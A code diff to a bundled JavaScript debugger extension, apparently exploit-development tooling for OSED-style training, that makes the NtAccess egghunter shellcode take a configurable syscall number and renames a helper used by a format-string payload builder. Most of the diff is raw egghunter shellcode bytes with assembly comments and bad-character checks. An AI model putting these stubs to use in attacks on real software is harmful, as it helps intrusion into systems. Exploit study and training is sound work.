@@ -2186,11 +2186,12 @@ var osed_bundle = (() => {
     // inc edx
     82,
     // push edx
-    106,
-    2,
-    // push 0x2
-    88,
-    // pop eax
+    184,
+    201,
+    1,
+    0,
+    0,
+    // mov eax, 0x1C9
     205,
     46,
     // int 0x2e
@@ -2200,7 +2201,7 @@ var osed_bundle = (() => {
     90,
     // pop edx
     116,
-    239,
+    237,
     // je short (back to or dx)
     184,
     84,
@@ -2214,12 +2215,12 @@ var osed_bundle = (() => {
     175,
     // scasd
     117,
-    234,
+    232,
     // jne short (back to inc edx)
     175,
     // scasd
     117,
-    231,
+    229,
     // jne short (back to inc edx)
     255,
     231
@@ -2228,35 +2229,53 @@ var osed_bundle = (() => {
   var NTACCESS_WOW64 = [
     102,
     129,
-    202,
+    201,
     255,
     15,
+    // or cx, 0x0fff
     65,
-    106,
-    2,
-    88,
+    // inc ecx
+    81,
+    // push ecx
+    184,
+    201,
+    1,
+    0,
+    0,
+    // mov eax, 0x1C9
     205,
     46,
+    // int 0x2e
     60,
     5,
-    90,
+    // cmp al, 0x5
+    89,
+    // pop ecx
     116,
-    239,
+    237,
+    // je short (back to or cx)
     184,
     84,
     48,
     48,
     87,
+    // mov eax, <TAG>
     139,
-    250,
+    249,
+    // mov edi, ecx
     175,
+    // scasd
     117,
-    234,
+    232,
+    // jne short (back to inc ecx)
     175,
+    // scasd
     117,
-    231,
+    229,
+    // jne short (back to inc ecx)
     255,
     231
+    // jmp edi
   ];
   var SEH_EGGHUNTER = [
     // jmp short install_seh
@@ -2361,9 +2380,11 @@ var osed_bundle = (() => {
     231
     // jmp edi
   ];
-  var TAG_OFFSET_NTACCESS = 18;
-  var TAG_OFFSET_NTACCESS_WOW64 = 16;
+  var TAG_OFFSET_NTACCESS = 20;
+  var TAG_OFFSET_NTACCESS_WOW64 = 20;
   var TAG_OFFSET_SEH = 52;
+  var SYSCALL_OFFSET_NTACCESS = 8;
+  var SYSCALL_OFFSET_NTACCESS_WOW64 = 8;
   function uniqueBytes(values) {
     const seen = /* @__PURE__ */ new Set();
     for (const v of values != null ? values : []) {
@@ -2383,11 +2404,16 @@ var osed_bundle = (() => {
   function tagBytes(tag) {
     return tag.padEnd(4, "X").slice(0, 4).split("").map((c) => c.charCodeAt(0));
   }
+  function dwordLE(val) {
+    return [val & 255, val >> 8 & 255, val >> 16 & 255, val >> 24 & 255];
+  }
   function buildEgghunter(options) {
+    var _a;
     const tag = tagBytes(options.tag);
     const badSet = new Set(uniqueBytes(options.badchars));
     let template;
     let tagOffset;
+    let syscallOffset = null;
     let label;
     if (options.mode === "seh") {
       template = [...SEH_EGGHUNTER];
@@ -2396,15 +2422,23 @@ var osed_bundle = (() => {
     } else if (options.wow64) {
       template = [...NTACCESS_WOW64];
       tagOffset = TAG_OFFSET_NTACCESS_WOW64;
+      syscallOffset = SYSCALL_OFFSET_NTACCESS_WOW64;
       label = "ntaccess wow64 egghunter";
     } else {
       template = [...NTACCESS_X86];
       tagOffset = TAG_OFFSET_NTACCESS;
+      syscallOffset = SYSCALL_OFFSET_NTACCESS;
       label = "ntaccess egghunter";
     }
     template.splice(tagOffset, 4, ...tag);
+    let syscallUsed = null;
+    if (syscallOffset !== null) {
+      const sysnum = (_a = options.syscall) != null ? _a : 457;
+      template.splice(syscallOffset, 4, ...dwordLE(sysnum));
+      syscallUsed = sysnum;
+    }
     const badcharHits3 = checkBadchars(template, label, badSet);
-    return { bytes: template, size: template.length, badcharHits: badcharHits3 };
+    return { bytes: template, size: template.length, badcharHits: badcharHits3, syscallUsed };
   }
   function bytesToHex(bytes) {
     return bytes.map((v) => v.toString(16).toUpperCase().padStart(2, "0")).join("");
@@ -2416,30 +2450,34 @@ var osed_bundle = (() => {
     return {
       name: "egghunter",
       description: "Generate NtAccess/SEH egghunter stubs with badchar checking.",
-      usage: "dx @$osed().egghunter(tag?, mode?, wow64?, badchars?)",
+      usage: "dx @$osed().egghunter(tag?, mode?, wow64?, badchars?, syscall?)",
       examples: [
         'dx @$osed().egghunter("W00T")',
         'dx @$osed().egghunter("B33F", "seh")',
         'dx @$osed().egghunter("W00T", "ntaccess", true)',
-        'dx @$osed().egghunter("W00T", "ntaccess", false, "00 0A 0D")'
+        'dx @$osed().egghunter("W00T", "ntaccess", false, "00 0A 0D")',
+        'dx @$osed().egghunter("W00T", "ntaccess", false, "", 0x1c9)'
       ],
       schema: {
         tag: { type: "string", default: "W00T" },
         mode: { type: "string", enum: ["ntaccess", "seh"], default: "ntaccess" },
         wow64: { type: "boolean", default: false },
-        badchars: { type: "array", default: [] }
+        badchars: { type: "array", default: [] },
+        syscall: { type: "number", default: null }
       },
       execute(options) {
-        var _a, _b, _c, _d;
+        var _a, _b, _c, _d, _e;
         const opts = {
           tag: (_a = options.tag) != null ? _a : "W00T",
           mode: (_b = options.mode) != null ? _b : "ntaccess",
           wow64: (_c = options.wow64) != null ? _c : false,
-          badchars: (_d = options.badchars) != null ? _d : []
+          badchars: (_d = options.badchars) != null ? _d : [],
+          syscall: (_e = options.syscall) != null ? _e : null
         };
         const result3 = buildEgghunter(opts);
         section("Egghunter");
-        info(`Tag: ${opts.tag} | Mode: ${opts.mode}${opts.wow64 ? " (WoW64)" : ""} | Size: ${result3.size} bytes`);
+        const sysLabel = result3.syscallUsed !== null ? ` | Syscall: 0x${result3.syscallUsed.toString(16).toUpperCase()}` : "";
+        info(`Tag: ${opts.tag} | Mode: ${opts.mode}${opts.wow64 ? " (WoW64)" : ""} | Size: ${result3.size} bytes${sysLabel}`);
         print(bytesToHex(result3.bytes));
         print(bytesToPython(result3.bytes));
         if (result3.badcharHits.length > 0) {
@@ -9743,7 +9781,7 @@ var osed_bundle = (() => {
     }
     throw new Error(`Cannot parse "${String(value)}" as a 32-bit value.`);
   }
-  function dwordLE(value) {
+  function dwordLE2(value) {
     return [value & 255, value >>> 8 & 255, value >>> 16 & 255, value >>> 24 & 255];
   }
   function buildFormatString(options) {
@@ -9772,7 +9810,7 @@ var osed_bundle = (() => {
     }
     entries.sort((a, b) => a.chunkVal - b.chunkVal);
     const addressDwords = entries.map((entry) => entry.targetAddr);
-    const addressBlock = addressDwords.flatMap(dwordLE);
+    const addressBlock = addressDwords.flatMap(dwordLE2);
     const addressBlockLen = addressBlock.length;
     let runningCount = prefix + addressBlockLen >>> 0;
     const rows = [];
@@ -9803,7 +9841,7 @@ var osed_bundle = (() => {
       });
     });
     for (const write2 of options.writes) {
-      for (const b of dwordLE(write2.addr >>> 0)) {
+      for (const b of dwordLE2(write2.addr >>> 0)) {
         if (exclude.has(b)) {
           warnings.push(`Target address 0x${(write2.addr >>> 0).toString(16).toUpperCase().padStart(8, "0")} contains badchar 0x${b.toString(16).padStart(2, "0")} \u2014 cannot be delivered as-is.`);
           break;
@@ -12138,10 +12176,10 @@ var osed_bundle = (() => {
         value = true ? "1.0.4" : globalThis[key2];
         break;
       case "__OSED_BUILD_TIME__":
-        value = true ? "2026-09-06T20:43:12.008Z" : globalThis[key2];
+        value = true ? "2026-09-17T01:47:09.433Z" : globalThis[key2];
         break;
       case "__OSED_GIT_COMMIT__":
-        value = true ? "18c6d6edaa08" : globalThis[key2];
+        value = true ? "c7e7d8e2700d" : globalThis[key2];
         break;
     }
     return typeof value === "string" && value.length > 0 ? value : fallback;
